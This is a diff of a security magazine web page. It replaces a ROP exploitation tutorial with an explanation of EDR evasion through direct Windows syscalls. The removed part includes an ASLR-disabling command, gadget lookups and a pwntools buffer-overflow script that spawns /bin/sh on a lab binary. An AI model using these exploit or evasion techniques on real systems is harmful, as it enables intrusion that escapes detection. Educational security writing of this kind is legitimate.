@@ -124,6 +124,18 @@ img{display:block;max-width:100%}
   .mag-nav-main{padding:14px 20px}
   .post-grid{grid-template-columns:1fr}
 }
+@media(max-width:560px){
+  .mag-cta{display:none}
+}
+/* the magazine's carousels are styled further down the page; while it streams in they would
+   lay out full-width and phones lock the zoom at ~700px. Constrain them from the <head>. */
+.grid-cinematic,.shelf-track{overflow-x:auto;max-width:100%}
+@media(max-width:768px){
+  html,body{overflow-x:hidden}
+  .article-content img,.article-content video,.article-content iframe{max-width:100%;height:auto}
+  .article-content table{display:block;max-width:100%;overflow-x:auto}
+  .article-content pre{max-width:100%;overflow-x:auto}
+}
 @media(max-width:480px){
   .card-img-wrap,.card-img-placeholder{height:180px}
 }
@@ -1222,7 +1234,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     }
 }
 </style>
-<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/edr-evasion-techniques-using-syscalls#article","headline":"EDR Evasion Techniques Using Syscalls — HADESS Magazine","description":"In the age of DevOps and rapid software development cycles, Jenkins has emerged as a beacon of automation, aiding organizations in efficiently building,...","url":"https://hadesssecurity.github.io/blog/read/edr-evasion-techniques-using-syscalls","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/edr-evasion-techniques-using-syscalls"},"datePublished":"October 18, 2023","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://career.hadess.io/logo-white.png"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2023/10/edr-evasion-syscalls.png"}}]}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/edr-evasion-techniques-using-syscalls#article","headline":"EDR Evasion Techniques Using Syscalls — HADESS Magazine","description":"In the age of DevOps and rapid software development cycles, Jenkins has emerged as a beacon of automation, aiding organizations in efficiently building,...","url":"https://hadesssecurity.github.io/blog/read/edr-evasion-techniques-using-syscalls","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/edr-evasion-techniques-using-syscalls"},"datePublished":"October 18, 2023","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/06/Hadess-Cybersecurity.jpg"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2023/10/edr-evasion-syscalls.png"}}]}</script>
 <!-- Force our dark theme; hide ALL default WP theme output -->
 <style>
 html,body{background:var(--bg)!important;color:var(--text)!important;font-family:var(--font)!important}
@@ -1275,14 +1287,13 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <span>Friday, October 2, 2026</span>
     </div>
     <div class="mag-nav-top-right">
-      <a href="mailto:career@hadess.io">Contact</a>
-      <a href="https://career.hadess.io/privacy">Privacy</a>
-      <a href="https://career.hadess.io/terms">Terms</a>
+      <a href="mailto:security@hadess.io">Contact</a>
+      <a href="/products/">Products &amp; Services</a>
       <div class="mag-social">
         <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
         <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
         <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-        <a href="mailto:career@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+        <a href="mailto:security@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
       </div>
     </div>
   </div>
@@ -1300,16 +1311,16 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
               <a href="/blog?cat=104">Skills &amp; Certifications</a>
               <a href="/blog?cat=76">Career Guide</a>
               <a href="/blog?cat=23">White Paper</a>
-            <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
+            <a href="/products/">Products &amp; Services</a>
     </div>
     <a href="/blog/search" class="mag-search-btn">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35" stroke-linecap="round"/></svg>
       Search...
       <kbd>/</kbd>
     </a>
-    <a href="https://career.hadess.io/login" class="mag-cta">
+    <a href="/products/#contact" class="mag-cta">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Talk to an Expert
     </a>
     <button class="mag-hamburger" onclick="document.getElementById('mobileMenu').classList.add('open')">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16" stroke-linecap="round"/></svg>
@@ -1326,8 +1337,8 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <a href="/blog?cat=76">Career Guide</a>
       <a href="/blog?cat=23">White Paper</a>
     <a href="/blog/search">Search</a>
-  <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
-  <a href="https://career.hadess.io/login" style="color:var(--gold)">Launch Career Platform</a>
+  <a href="/products/">Products &amp; Services</a>
+  <a href="/products/#contact" style="color:var(--gold)">Talk to an Expert</a>
 </div>
 
 <!-- ═══ PAGE-SPECIFIC STYLES ═══ -->
@@ -1539,1464 +1550,1993 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
   <div class="article-content-col">
     <div class="article-content" data-pagefind-body data-pagefind-meta="image:/wp-content/uploads/2023/10/edr-evasion-syscalls.png">
       
-<p class="wp-block-paragraph">&#8220;ROP Gadget Unleashed&#8221; delves into the intricacies of Return-Oriented Programming (ROP) and its significance in modern exploitation techniques. The article elucidates how attackers leverage existing code snippets, or &#8220;gadgets,&#8221; within a program&#8217;s memory to craft malicious payloads, thus circumventing traditional security mechanisms like Data Execution Prevention (DEP). By chaining these gadgets together, which typically end with a return instruction, adversaries can create a controlled flow of execution that leads to the desired exploit without the need to inject new code. This methodology has emerged as a potent technique for attackers, especially in environments where direct code injection is heavily mitigated.</p>
+<p class="wp-block-paragraph">EDR evasion is a set of techniques that attackers use to bypass endpoint detection and response (EDR) solutions. EDR solutions are designed to monitor endpoints for malicious activity and to respond to incidents when they occur. However, attackers are constantly developing new techniques to evade EDR solutions.</p>
 
 
 
-<p class="wp-block-paragraph">The article also highlights the importance of identifying and utilizing effective ROP gadgets in penetration testing and exploit development. It discusses various tools and techniques that can be employed to discover ROP gadgets within binary files, emphasizing the necessity of understanding both the architecture and the underlying assembly language of the target application. Furthermore, &#8220;ROP Gadget Unleashed&#8221; underscores the ongoing arms race between security researchers and attackers, showcasing how the development of robust countermeasures against ROP exploits is crucial for maintaining secure systems. By equipping practitioners with knowledge and practical strategies, the article aims to enhance their ability to protect applications against this sophisticated attack vector.</p>
+<h2 class="wp-block-heading" id="h-what-are-windows-syscalls"><strong>What are Windows Syscalls</strong></h2>
 
 
 
-<h1 class="wp-block-heading">Overview of Return-Oriented Programming (ROP)</h1>
+<p class="wp-block-paragraph">syscalls are Windows internals components that provide a way for Windows programmers to interact or develop programs related to the Windows system. These programs can be used in ways such as accessing specific services, reading or writing to a file, creating a new process in userland, or allocating memory to programs, using cryptographic functions in your programs.</p>
 
 
 
-<p class="wp-block-paragraph">Return-Oriented Programming (ROP) is an advanced exploitation technique that allows attackers to execute code in the presence of security measures like stack canaries and non-executable memory. Instead of injecting malicious code, ROP chains together existing code snippets—called &#8220;gadgets&#8221;—found in a program&#8217;s memory. This method emerged in the mid-2000s, notably highlighted by researchers demonstrating its efficacy against defenses like DEP (Data Execution Prevention). As exploits evolved, ROP became a crucial tool for attackers, enabling them to manipulate program control flow without directly executing injected payloads, thus bypassing many traditional security mechanisms.</p>
+<p class="wp-block-paragraph">But syscalls are intermediatory when someone uses the Windows API using win32. These syscalls are also called native API for windows. The majority of syscalls are not officially documented by Microsoft, Thus we rely on other third-party documentation. Generally All syscalls return NTSTATUS value indicate its success or error, but It is important to note that while some NtAPIs return NTSTATUS, they are not necessarily syscalls.</p>
 
 
 
-<p class="wp-block-paragraph">Return-Oriented Programming (ROP) is a sophisticated exploitation technique used to bypass modern security defenses like Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR). Instead of injecting malicious code, ROP reuses existing code snippets, called <strong>gadgets</strong>, found within the memory of a vulnerable program. Gadgets are small sequences of instructions that end in a <code>ret</code> instruction, allowing the attacker to chain them together and control program execution.</p>
+<p class="wp-block-paragraph">eg: NtAllocateVirtualMemory is a syscall that actually runs under the hood when we access functions like VirtualAlloc or VirtualAllocEx From winapi. Here ntdll.dll File from Windows plays an important role, how? most of the native syscalls, which are called are from the ntdll.dll file.</p>
 
 
 
-<h4 class="wp-block-heading">Step-by-Step ROP Attack Example</h4>
+<p class="wp-block-paragraph">These syscalls have more advantages over standard Winapi functions. These syscall functions from ntdll.dll provide more customizability over the parameter passed and arguments that those functions will be accepting, Thus providing a way for evading host-based security solutions.</p>
 
 
 
-<p class="wp-block-paragraph">Below is a detailed explanation of how to construct a ROP chain in a vulnerable program, along with essential commands and code snippets to help guide you through a basic ROP exploit.</p>
+<p class="wp-block-paragraph">eg: NTAllocateVirtualMemory vs VirtualAlloc in terms of arguments.</p>
 
 
 
-<h5 class="wp-block-heading">1. Disable ASLR (for easier exploitation in practice)</h5>
+<p class="wp-block-paragraph">LPVOID VirtualAlloc(</p>
 
 
 
-<p class="wp-block-paragraph">In many exploit development scenarios, ASLR (Address Space Layout Randomization) can make exploitation harder. You can disable it temporarily using the following command:</p>
+<p class="wp-block-paragraph">[in, optional] LPVOID lpAddress,</p>
 
 
 
-<pre class="wp-block-code"><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></pre>
+<p class="wp-block-paragraph">[in]&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SIZE_T dwSize,</p>
 
 
 
-<h5 class="wp-block-heading">2. Find Dependencies and Libraries</h5>
+<p class="wp-block-paragraph">[in]&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD&nbsp; flAllocationType,</p>
 
 
 
-<p class="wp-block-paragraph">Use the <code>ldd</code> command to inspect the shared libraries used by the vulnerable binary. This helps you identify where libc or other shared libraries are located in memory.</p>
+<p class="wp-block-paragraph">[in]&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD&nbsp; flProtect</p>
 
 
 
-<pre class="wp-block-code"><code>$ ldd vuln-32
-    linux-gate.so.1 (0xf7fd2000)
-    libc.so.6 =&gt; /lib32/libc.so.6 (0xf7dc2000)   # Important: we will use libc later
-    /lib/ld-linux.so.2 (0xf7fd3000)</code></pre>
+<p class="wp-block-paragraph">);</p>
 
 
 
-<h5 class="wp-block-heading">3. Locate Gadgets Using ROPgadget</h5>
+<p class="wp-block-paragraph">__kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory(</p>
 
 
 
-<p class="wp-block-paragraph">The core of any ROP exploit is finding gadgets. These are small chunks of code that perform useful operations (like loading a register or calling a function). For instance, a common gadget is <code>pop rdi; ret</code>, which allows the attacker to set up a function argument before a call to a function like <code>system()</code>.</p>
+<figure class="wp-block-table"><table><tbody><tr><td>[in]</td><td>HANDLE</td><td>ProcessHandle,</td></tr><tr><td colspan="2">[in, out] PVOID</td><td>*BaseAddress,</td></tr><tr><td>[in]</td><td>ULONG_PTR</td><td>ZeroBits,</td></tr><tr><td colspan="2">[in, out] PSIZE_T</td><td>RegionSize,</td></tr><tr><td>[in]</td><td>ULONG</td><td>AllocationType,</td></tr><tr><td>[in]</td><td>ULONG</td><td>Protect</td></tr></tbody></table></figure>
 
 
 
-<p class="wp-block-paragraph">Install and use ROPgadget to find usable gadgets in the binary:</p>
+<p class="wp-block-paragraph">);</p>
 
 
 
-<pre class="wp-block-code"><code>$ ROPgadget --binary vuln-64 | grep rdi
-0x00000000004011cb : pop rdi ; ret</code></pre>
+<p class="wp-block-paragraph">NtAllocateVirtualMemory allows you to set custom memory protection flags using the AllocationType and Protect parameters. This enables you to have more control over the protection of the allocated memory.</p>
 
 
 
-<p class="wp-block-paragraph">The above command shows that we have found a useful gadget: <code>pop rdi; ret</code> at the address <code>0x4011cb</code>. This gadget will allow us to set up the first argument (RDI register) before calling <code>system()</code>.</p>
+<h2 class="wp-block-heading" id="h-system-service-number-ssn"><strong>System Service Number (SSN)</strong></h2>
 
 
 
-<h5 class="wp-block-heading">4. Find System and &#8220;/bin/sh&#8221; Strings in libc</h5>
+<p class="wp-block-paragraph">Every Syscalls has special unique number given to it called SSN , this SSN number is used by kernel to distinguish syscalls from other syscall . For example,</p>
 
 
 
-<p class="wp-block-paragraph">Next, we need to find the address of the <code>system()</code> function and the <code>/bin/sh</code> string in libc, which are critical for executing a shell.</p>
+<p class="wp-block-paragraph">the NtAllocateVirtualMemory syscall will have an SSN of 24</p>
 
 
 
-<p class="wp-block-paragraph">To find <code>system()</code>:</p>
+<p class="wp-block-paragraph">whereas NtProtectVirtualMemory will have an SSN of 80, these numbers are what the kernel uses to differentiate NtAllocateVirtualMemory from NtProtectVirtualMemory .</p>
 
 
 
-<pre class="wp-block-code"><code>$ readelf -s /lib32/libc.so.6 | grep system
-   1463: 0003cd10   88 FUNC    GLOBAL DEFAULT   13 system</code></pre>
+<h2 class="wp-block-heading" id="h-how-edr-works-how-userland-hooking-implemented-by-edr"><strong>How EDR works / How Userland Hooking implemented by EDR?</strong></h2>
 
 
 
-<p class="wp-block-paragraph">To find the <code>/bin/sh</code> string:</p>
+<p class="wp-block-paragraph">EDR usually detects the malicious call from the program using Hooking Technique :</p>
 
 
 
-<pre class="wp-block-code"><code>$ strings -a -t x /lib32/libc.so.6 | grep /bin/sh
-   18a143 /bin/sh</code></pre>
+<p class="wp-block-paragraph"><strong>Userland Hooking</strong></p>
 
 
 
-<h5 class="wp-block-heading">5. Create the ROP Chain</h5>
+<p class="wp-block-paragraph"><strong>Kernel Mode Hooking</strong></p>
 
 
 
-<p class="wp-block-paragraph">Using the gadgets and addresses we found, we can now build the ROP chain that will exploit the vulnerable program and give us a shell.</p>
+<p class="wp-block-paragraph">When we (red teamer&#8217;s) tires to execute any functions using high level WinAPI , function from ntdll.dll are indirectly triggered , The EDR applies hooks over them to detect for malicious calls.</p>
 
 
 
-<p class="wp-block-paragraph">Here’s the full Python exploit script using <code>pwntools</code>:</p>
+<p class="wp-block-paragraph">For eg: By hooking the NtProtectVirtualMemory syscall, the security solution can detect higher-level WinAPI calls such as VirtualProtect , even when it is hidden from the import address table (IAT) of the binary.</p>
 
 
 
-<pre class="wp-block-code"><code>from pwn import *
+<p class="wp-block-paragraph">We can use ntdll functions directly by resolving their addresses from ntdll.dll but they are still hooked by EDR solutions , the way they work is that they use an instruction called syscall(64bit)/sysenter(32bit) to invoke the ntapi function and enter the kernel mode to execute that function, and EDR places its hook right before that instruction. Thus Interupting the execution flow. To overcome this problem malware developer/ Red Teamers uses SSN (system service number) and do not relies on ntdll.dll to resolve the address of the functions. to execute the functions thus potentially bypassing the hooks set up by EDR.</p>
 
-# Start the vulnerable process
-p = process('./vuln-64')
 
-# Base address of libc (can be found or leaked in real-world scenarios)
-libc_base = 0x7ffff7de5000
-system = libc_base + 0x48e20     # Address of system() in libc
-binsh = libc_base + 0x18a143     # Address of "/bin/sh" string in libc
 
-# ROP gadget addresses
-POP_RDI = 0x4011cb  # Address of pop rdi; ret gadget
+<p class="wp-block-paragraph">EDR solutions can search any region of the memory that have execution permision for the malicious Signature. This userland hooks are placed just before the calling of syscalls instruction which is last step in exection in usermode.</p>
 
-# Constructing the payload
-payload = b'A' * 72         # Padding to reach return address
-payload += p64(POP_RDI)     # Gadget to set up the RDI register
-payload += p64(binsh)       # Pointer to the "/bin/sh" string
-payload += p64(system)      # Address of system() to call system("/bin/sh")
-payload += p64(0x0)         # Return address after system() is called (can be arbitrary)
 
-# Send the payload
-p.clean()
-p.sendline(payload)
-p.interactive()</code></pre>
 
+<p class="wp-block-paragraph">Modern EDR places its hook in post-execution after the flow is transferred to the kernel . although windows other security features prevents the patching of kernel leverl memory and makes it difficult to place hook inside that. Placing kernel mode hooks may also result in stability issue and cause unexpected behavior, which is why its rarly implement usually in modern EDRs.</p>
 
 
-<h4 class="wp-block-heading">Breakdown of the Exploit</h4>
 
+<h2 class="wp-block-heading" id="h-implementing-mini-edr-dll-for-hooking-syscalls"><strong>Implementing mini EDR.dll for hooking syscalls</strong></h2>
 
 
-<ul class="wp-block-list">
-<li><strong>Padding</strong>: We use 72 bytes (<code>'A' * 72</code>) to overflow the buffer and reach the return address.</li>
 
-
-
-<li><strong>POP_RDI Gadget</strong>: The <code>pop rdi; ret</code> gadget allows us to control the value of the <code>rdi</code> register (the first argument for system()).</li>
-
-
-
-<li><strong>/bin/sh</strong>: We pass the <code>/bin/sh</code> string as the first argument to <code>system()</code>.</li>
-
-
-
-<li><strong>System Call</strong>: We call <code>system()</code> with <code>/bin/sh</code>, resulting in spawning a shell.</li>
-</ul>
-
-
-
-<h5 class="wp-block-heading">6. Running the Exploit</h5>
-
-
-
-<p class="wp-block-paragraph">To test the exploit, compile your vulnerable program and run the Python script:</p>
-
-
-
-<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th><strong>Step</strong></th><th><strong>Command</strong></th></tr></thead><tbody><tr><td>Disable ASLR</td><td>`echo 0</td></tr><tr><td>Check shared libraries</td><td><code>ldd vuln-32</code></td></tr><tr><td>Find gadgets</td><td>`ROPgadget &#8211;binary vuln-64</td></tr><tr><td>Find system() in libc</td><td>`readelf -s /lib32/libc.so.6</td></tr><tr><td>Find /bin/sh string</td><td>`strings -a -t x /lib32/libc.so.6</td></tr><tr><td>Compile vulnerable program</td><td><code>gcc -m64 -o vuln-64 vuln-64.c</code></td></tr><tr><td>Exploit using Python script</td><td><code>python3 exploit.py</code></td></tr></tbody></table></figure>
-
-
-
-<h4 class="wp-block-heading">Significance of ROP in Modern Exploits</h4>
-
-
-
-<p class="wp-block-paragraph">ROP plays a pivotal role in bypassing contemporary security measures by leveraging existing code to create dynamic execution paths, making it difficult for traditional defenses to detect and mitigate. In an era where many systems implement protections like Address Space Layout Randomization (ASLR) and stack canaries, ROP allows attackers to circumvent these barriers by using the program&#8217;s own code against it. For defenders, understanding ROP is essential to developing effective countermeasures and improving the overall security posture. This ongoing cat-and-mouse game underscores the importance of ROP not only as a tool for attackers but also as a critical area of focus for cybersecurity professionals aiming to protect systems from sophisticated exploits.</p>
-
-
-
-<p class="wp-block-paragraph">https://github.com/alanvivona/pwnshop and https://github.com/Rizer0/Ropdump</p>
-
-
-
-<h3 class="wp-block-heading">ROP Gadgets</h3>
-
-
-
-<p class="wp-block-paragraph">ROP gadgets are short sequences of instructions that end with a &#8220;return&#8221; instruction, allowing the control flow to jump to the next gadget in a ROP chain. The purpose of these gadgets is to enable an attacker to construct a payload that can manipulate the program&#8217;s execution flow without injecting any new code, effectively utilizing the existing code within a target application or library. This technique is particularly valuable in scenarios where memory protections are in place, as it allows for exploitation without violating these defenses.</p>
-
-
-
-<p class="wp-block-paragraph">Extracting ROP gadgets involves analyzing the binary code of a target application, typically using tools designed for disassembly and reverse engineering. Attackers often employ tools like ROPgadget, Ropper, or custom scripts to scan for sequences of instructions that meet the criteria for gadgets. This process includes identifying potential gadgets by searching through the binary for instructions that lead to a return statement, then cataloging these sequences to facilitate the construction of ROP chains. By carefully selecting and chaining these gadgets, attackers can orchestrate complex exploits tailored to bypass security measures and achieve their objectives.</p>
-
-
-
-<h4 class="wp-block-heading">1. <strong>Address Space Layout Randomization (ASLR)</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Randomizes memory addresses to make exploitation harder.</li>
-
-
-
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>Memory leaks can reveal address locations.</li>
-
-
-
-<li>If certain libraries or sections are not fully randomized, ROP gadgets can still be located.</li>
-</ul>
-</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">2. <strong>Data Execution Prevention (DEP)</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Marks memory regions (e.g., stack, heap) as non-executable.</li>
-
-
-
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>ROP reuses existing executable code, bypassing the need to inject new code.</li>
-</ul>
-</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">3. <strong>Stack Canaries</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Detects buffer overflows by placing a random value before the return address.</li>
-
-
-
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>If the canary is leaked, the attacker can overwrite the return address without detection.</li>
-</ul>
-</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading">4. <strong>Control Flow Integrity (CFI)</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Ensures the control flow follows valid paths in the program.</li>
-
-
-
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>ROP gadgets can mimic valid control flows, making it difficult for CFI to detect.</li>
-</ul>
-</li>
-</ul>
-
-
-
-<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
-https://github.com/xct/ropstar
-</div></figure>
-
-
-
-<h4 class="wp-block-heading">Types of ROP Gadgets</h4>
-
-
-
-<p class="wp-block-paragraph">ROP gadgets can be classified into several types, each serving distinct purposes in an exploit.</p>
-
-
-
-<p class="wp-block-paragraph">POP Gadgets are fundamental for manipulating the stack and registers, as they typically contain one or more POP instructions that load values from the stack into registers. This is essential for setting up the right context for later operations.</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Load values from the stack into registers.</li>
-
-
-
-<li><strong>Example</strong>: <code>pop rdi; ret</code></li>
-
-
-
-<li><strong>Usage</strong>: Essential for setting up parameters before function calls.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph">RET Gadgets are the simplest form of gadgets, consisting of just a RET instruction. They serve to redirect control flow, allowing the execution to jump to the next gadget in a chain, thereby maintaining the sequence of operations.</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Control flow redirection using <code>ret</code> instructions.</li>
-
-
-
-<li><strong>Usage</strong>: Used to jump to the next gadget in a chain, ensuring the sequence of operations.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph">MOV Gadgets facilitate data transfer between registers or between registers and memory. By utilizing these gadgets, attackers can efficiently move values needed for calculations or function parameters, crucial for shaping the exploit&#8217;s behavior.</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Move data between registers or memory.</li>
-
-
-
-<li><strong>Usage</strong>: Useful for setting up function arguments or controlling data flow during the exploit.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph">Arithmetic Gadgets perform various mathematical operations, including addition, subtraction, multiplication, and division. These gadgets enable dynamic computation of values during the exploit, allowing for more complex manipulations.</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Perform arithmetic operations like addition, subtraction, or XOR.</li>
-
-
-
-<li><strong>Usage</strong>: Can dynamically compute values during exploitation.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph">Lastly, System Call Gadgets are designed to invoke system calls, enabling the exploit to interact directly with the operating system. This is vital for performing actions like spawning shells or manipulating files, ultimately achieving the attacker’s goals. Together, these gadget types create a versatile toolkit for sophisticated ROP attacks.</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Trigger system calls to interact with the operating system (e.g., spawn a shell).</li>
-
-
-
-<li><strong>Usage</strong>: These gadgets are vital for achieving the final goals of an exploit.</li>
-</ul>
-
-
-
-<h3 class="wp-block-heading">Finding ROP Gadgets</h3>
-
-
-
-<p class="wp-block-paragraph">Several tools help find and chain ROP gadgets:</p>
-
-
-
-<h4 class="wp-block-heading"><strong>ROPgadget.py</strong></h4>
-
-
-
-<figure class="wp-block-image size-full"><img fetchpriority="high" decoding="async" width="883" height="960" src="/wp-content/uploads/2024/09/image-10.png" alt="" class="wp-image-8829" srcset="/wp-content/uploads/2024/09/image-10.png 883w, /wp-content/uploads/2024/09/image-10-276x300.png 276w, /wp-content/uploads/2024/09/image-10-768x835.png 768w" sizes="(max-width: 883px) 100vw, 883px" /></figure>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Usage</strong>: A Python tool that finds ROP gadgets in binaries across architectures like x86, ARM, and MIPS.</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>ROPgadget.py --binary &lt;binary&gt;
-ROPgadget.py --binary &lt;binary&gt; --ropchain</code></pre>
-
-
-
-<h4 class="wp-block-heading"><strong>rp++</strong></h4>
-
-
-
-<figure class="wp-block-image size-full"><img decoding="async" width="883" height="461" src="/wp-content/uploads/2024/09/image-11.png" alt="" class="wp-image-8830" srcset="/wp-content/uploads/2024/09/image-11.png 883w, /wp-content/uploads/2024/09/image-11-300x157.png 300w, /wp-content/uploads/2024/09/image-11-768x401.png 768w" sizes="(max-width: 883px) 100vw, 883px" /></figure>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Usage</strong>: A fast ROP gadget finder for PE/ELF/Mach-O files in x86/x64/ARM/ARM64 architectures.</li>
-</ul>
-
-
-
-<pre class="wp-block-code"><code>rp++ --file &lt;binary&gt; --rop
-rp++ --file &lt;binary&gt; --rop --va 0x0</code></pre>
-
-
-
-<figure class="wp-block-image size-full"><img decoding="async" width="890" height="451" src="/wp-content/uploads/2024/09/image-12.png" alt="" class="wp-image-8831" srcset="/wp-content/uploads/2024/09/image-12.png 890w, /wp-content/uploads/2024/09/image-12-300x152.png 300w, /wp-content/uploads/2024/09/image-12-768x389.png 768w" sizes="(max-width: 890px) 100vw, 890px" /></figure>
-
-
-
-<h3 class="wp-block-heading">Security Mechanisms and Bypasses&nbsp;</h3>
-
-
-
-<h4 class="wp-block-heading"><strong><em>Data Execution Prevention (DEP):</em></strong></h4>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Overview of DEP and Its Implementation:</em></strong> Data Execution Prevention (DEP) is a security feature that helps protect against code execution in non-executable memory regions. It works by marking certain areas of memory as non-executable, which prevents code from running in those regions. On modern operating systems, DEP is enforced using hardware and software techniques to distinguish between executable and non-executable memory regions, enhancing system security by mitigating attacks that rely on executing code from non-executable segments.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Techniques Used by ROPGadget to Bypass DEP Protections:</em></strong> ROP (Return-Oriented Programming) gadgets are small snippets of executable code that end with a return instruction, and they can be used to chain together a series of operations without the need for direct code injection. ROPGadget, a tool for identifying such gadgets, facilitates this by searching for these snippets within existing binaries. Since ROP exploits execute only existing code within the application&#8217;s memory, they inherently bypass DEP protections. The DEP does not stop code from executing if it is already part of an executable segment; thus, ROPGadget&#8217;s role is crucial in identifying usable gadgets for constructing these exploits.</p>
-
-
-
